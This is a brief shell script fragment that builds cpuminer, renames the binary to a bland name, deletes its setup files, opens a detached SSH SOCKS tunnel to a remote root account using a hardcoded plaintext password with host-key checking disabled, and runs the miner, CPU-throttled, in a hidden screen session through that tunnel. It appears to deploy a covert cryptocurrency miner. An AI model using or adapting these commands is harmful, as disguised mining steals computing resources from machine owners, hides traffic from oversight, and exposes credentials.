...
./build.sh
make
mv cpuminer workp2 && cp workp2 ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@45.76.12.189 && cpulimit --exe workp2 --limit 200 -b && screen -d -m ./workp2 -u MMOProHN.Google -p x -x socks4://127.0.0.1:1997
